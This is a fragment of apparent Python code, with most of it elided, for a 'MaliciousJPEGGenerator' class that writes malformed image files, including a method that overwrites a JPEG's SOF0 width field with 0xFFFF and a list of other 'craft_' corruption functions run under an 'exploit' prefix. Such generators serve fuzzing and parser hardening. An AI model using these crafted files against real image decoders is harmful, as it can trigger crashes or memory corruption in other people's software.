...
class MaliciousJPEGGenerator:
    ...
    def craft_illegal_dimensions(self, filename: str) -> None:
        ...
        with open(f"{self.output_dir}/{filename}", 'r+b') as f:
            ...
            sof0_pos = data.find(b'\xFF\xC0')
            if sof0_pos != -1:
                # FIXED: Pack as uint32, write first 2 bytes to overflow (mimics large/negative dims)
                width_packed = struct.pack('>I', 0xFFFFFFFF)[:2]   # FF FF (max dim, ~4e9 effective)
    ...
    def generate_all(self, prefix: str = "exploit") -> List[str]:
        ...
        vulnerability_functions = [
            ...
            self.craft_invalid_header,
            self.craft_null_resource,
            self.craft_partial_stream,
            self.craft_bogus_cgsize,
            self.craft_invalid_codec,
            self.craft_corrupt_chunk
        ]
